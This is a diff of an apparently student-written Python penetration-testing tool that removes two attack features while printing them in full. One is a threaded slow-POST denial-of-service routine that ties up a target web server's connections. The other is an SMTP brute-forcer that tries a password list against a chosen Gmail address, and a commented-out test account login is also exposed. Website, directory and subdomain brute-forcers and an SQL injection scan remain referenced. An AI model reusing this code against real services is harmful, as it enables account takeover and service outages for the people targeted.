@@ -37,39 +37,8 @@ passwordListPath = "utils/passwordLists/passlist.txt"
 subdomainListPath = "utils/subdomainLists/subdomains.txt"
 usernameListPath = "utils/usernameLists/usernames_small.txt"
 
-listOfFunctionalities = ["Email Brute-Forcer", "Website Brute-Forcer", "Directory Brute-Forcer",
-                         "Sub Domain Brute-Forcer", "DOS", "SQL Injection Scan", "Generate Report", "Exit"]
-
-# Classes
-
-class Worker(Thread):
-    def __init__(self, host, port, path, sleepTime):
-        self.host = host
-        self.port = port
-        self.path = path
-        self.sleepTime = sleepTime
-        self.stopped = False
-        threading.Thread.__init__(self)
-
-    def stop(self): self.stopped = True
-
-    def run(self):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((self.host, self.port))
-        s.settimeout(1)
-        s.send((
-            'POST ' + self.path + ' HTTP/1.1\r\n' +
-            'Host: ' + self.host + '\r\n' +
-            'Connection: close\r\n' +
-            'Content-Length: 1000000\r\n' +
-            '\r\n').encode('ascii')
-        )
-
-        while not self.stopped:
-            s.send(('abc=123&').encode('ascii'))
-            sleep(self.sleepTime / 1000)
-
-        s.close
+listOfFunctionalities = ["Website Brute-Forcer", "Directory Brute-Forcer",
+                         "Sub Domain Brute-Forcer", "SQL Injection Scan", "Generate Report", "Exit"]
 
 # Utilities
 
@@ -168,33 +137,6 @@ def generateReport():
 
 # Brute Forcers
 
-def emailBruteForce():
-
-    #Gmail Credentials of purposely created account:
-
-    # my_email = "pentester2472@gmail.com"
-    # password = "mcast1234"
-
-    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
-    smtpserver.ehlo()
-    smtpserver.starttls()
-
-    user = input("[*] Enter Targets Email Address: ")
-
-    file = open(passwordListPath, "r")
-
-    for password in file:
-        password = password.strip('\n')
-        try:
-            smtpserver.login(user, password)
-            print("[+] Password Found: %s" % password)
-
-            return True
-        except smtplib.SMTPAuthenticationError:
-            print("[-] Wrong Password: " + password)
-
-    return False
-
 def websiteBruteForce(page_url):
 
     with open(usernameListPath, "r") as usernames:
@@ -274,53 +216,6 @@ def subDomainsFinder(page_url):
 
     return subDomainFound
 
-# DDOS Tools
-
-def DOS(url, threads, sleepTime):
-
-    urlParts = urlparse(url)
-
-    if urlParts.scheme != 'http':
-        raise Exception('Only the http protocol is currently supported')
-
-    port = urlParts.port
-
-    if port is None:
-        port = 80
-
-    print(f"Opening {threads} sockets to {urlParts.hostname}:{port}")
-
-    pool = []
-
-    for i in range(1, threads):
-        t = Worker(urlParts.hostname, port, urlParts.path, sleepTime)
-        pool.append(t)
-        t.start()
-
-    print(f"Started {threads} threads.")
-
-    sleep(2)
-
-    try:
-        data_dictionary = {"username": 'admin', "password": 'password', "Login": "submit"}
-        requests.post(login_page, data=data_dictionary, timeout=10)
-        ddos_success = False
-    except:
-        ddos_success = True
-
-    sleep(1)
-
-    print("Is Website Currently Down?: " + str(ddos_success))
-
-    for worker in pool:
-        worker.stop()
-
-    for worker in pool:
-        worker.join()
-
-    print("Closed Threads!")
-
-    return ddos_success
 
 # SQL Injection
 
@@ -412,21 +307,7 @@ if __name__ == '__main__':
 
         methodChosen = menuMaker()
 
-        if methodChosen == "Email Brute-Forcer":
-
-            if "Email Brute-Forcer" not in hit_type:
-                hit_type.append("Email Brute-Forcer")
-
-            dateTimeStart = getCurrentDateTime()
-
-            if emailBruteForce():
-                if "Email Brute-Forcer" not in successful_hit_type:
-                    successful_hit_type.append("Email Brute Forcer")
-
-            dateTimeEnd = getCurrentDateTime()
-            total_seconds = total_seconds + differenceInSeconds(dateTimeStart, dateTimeEnd)
-
-        elif methodChosen == "Website Brute-Forcer":
+        if methodChosen == "Website Brute-Forcer":
 
             if "Website Brute-Forcer" not in hit_type:
                 hit_type.append("Website Brute-Forcer")
@@ -465,20 +346,6 @@ if __name__ == '__main__':
             if subDomainsFinder(website_url):
                 if "Sub Domain Brute Force" not in successful_hit_type:
                     successful_hit_type.append("Sub Domain Brute Force")
-
-            dateTimeEnd = getCurrentDateTime()
-            total_seconds = total_seconds + differenceInSeconds(dateTimeStart, dateTimeEnd)
-
-        elif methodChosen == "DOS":
-
-            if "DOS" not in hit_type:
-                hit_type.append("DOS")
-
-            dateTimeStart = getCurrentDateTime()
-
-            if DOS(root_url, 200, 1000):
-                if "DOS" not in successful_hit_type:
-                    successful_hit_type.append("DOS")
 
             dateTimeEnd = getCurrentDateTime()
             total_seconds = total_seconds + differenceInSeconds(dateTimeStart, dateTimeEnd)
